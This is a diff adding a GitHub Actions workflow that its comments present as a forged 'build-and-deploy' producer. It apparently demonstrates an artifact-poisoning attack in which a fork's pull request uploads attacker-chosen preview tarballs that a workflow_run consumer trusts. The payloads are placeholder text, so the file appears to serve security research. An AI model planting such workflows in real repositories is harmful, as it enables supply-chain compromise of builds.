@@ -1,0 +1,23 @@
+# Forged workflow. In the real attack this file lives on the attacker's fork
+# branch and is introduced by a pull request; GitHub keys `workflow_run` on the
+# workflow *name*, so this is indistinguishable from the genuine producer.
+name: build-and-deploy
+
+on:
+  pull_request:
+
+jobs:
+  fake-producer:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build attacker-chosen "preview tarballs"
+        run: |
+          mkdir -p preview-tarballs/@next/env preview-tarballs/next
+          printf 'ATTACKER-CONTROLLED-ENV-TARBALL' > preview-tarballs/@next/env/evil.tgz
+          printf 'ATTACKER-CONTROLLED-NEXT-TARBALL' > preview-tarballs/next/evil.tgz
+
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: preview-tarballs
+          path: preview-tarballs
+          retention-days: 1
